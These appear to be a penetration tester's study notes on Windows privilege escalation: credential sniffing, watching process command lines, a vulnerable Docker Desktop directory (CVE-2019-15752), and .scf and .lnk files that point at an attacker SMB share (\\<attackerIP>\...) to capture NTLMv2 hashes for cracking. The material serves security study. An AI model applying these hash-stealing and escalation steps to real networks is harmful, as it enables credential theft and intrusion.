
2026-05-26 18:10

Tags: #escalation 

## Interacting with Users

- If network monitoring tools like Wireshark or `tcpdump` are installed and accessible to unprivileged users, you can passively sniff the network for sensitive data.


- **Objective:** Capture cleartext credentials (e.g., FTP, HTTP) passing over the wire.


- **Tools:** Wireshark, `tcpdump`, or `net-creds` (to automatically parse pcaps or live interfaces for hashes and passwords).

## Process Command Line Monitoring

- Administrators or scheduled tasks often execute scripts or commands that **pass credentials directly in the command line**. Since these processes spin up and die quickly, continuous monitoring is required.


- **Objective:** Catch transient credentials passed as arguments in real-time.


- **Method:** Run a PowerShell loop that queries `Win32_Process` every few seconds, comparing the current process list to the previous one and outputting the differences to catch hidden background executions.
	- ![[Pasted image 20260526181704.png]]
	- ![[Pasted image 20260526181716.png]]


## Exploiting Vulnerable Services (e.g., Docker)

- Sometimes, services are **misconfigured** to allow low-privileged users to plant malicious files that get executed by high-privileged users or system processes.


- **Example (CVE-2019–15752):** Older versions of Docker Desktop had a misconfigured `version-bin` directory granting write access to the `BUILTIN\Users` group.


- **Exploitation:** An attacker drops a malicious executable (e.g., `docker-credential-wincred.exe`) into the folder. When a legitimate user runs `docker login`, the application executes the attacker's payload, potentially leading to privilege escalation.

## Malicious SCF Files (SMB Hash Stealing)

 - A **Shell Command File** (.scf) is used by Windows Explorer to navigate directories. Attackers can create a malicious `.scf` file to force a user's machine to authenticate to an attacker-controlled machine, exposing their NTLMv2 hash.


- **The Trap:** Drop an `.scf` file in a heavily accessed network share. Prefix the filename with an `@` (e.g., `@Inventory.scf`) so it sits at the top of the directory.


- **The Payload:** Set the `IconFile` path to point to your attacker IP (`\\<attackerIP>\share\fake.ico`).
	- ![[Screenshot_20260526_183306.png]]


- **The Capture:** When a user simply _views_ the folder, Windows attempts to load the icon via SMB. Run **Responder** or **Inveigh** on your attack machine to catch the inbound NTLMv2 hash.
	- ![[Pasted image 20260526182509.png]]


- **The Crack:** Take the captured hash and crack it offline using tools like **Hashcat** to retrieve the cleartext password.

## Malicious .lnk Files (Modern Environments)

- The `.scf` trick has been patched on newer operating systems like Windows Server 2019, but the exact same concept works using Windows Shortcut (`.lnk`) files.


- **The Trap:** Use a tool like Lnkbomb or a few lines of PowerShell to generate a malicious shortcut.


- **The Payload:** Set the `$lnk.TargetPath` to point to an attacker-controlled SMB share (e.g., `\\<attackerIP>\@pwn.png`).


- **The Result:** Just like the SCF method, browsing the directory triggers an authentication request, allowing you to intercept the hash with Responder.
## References:

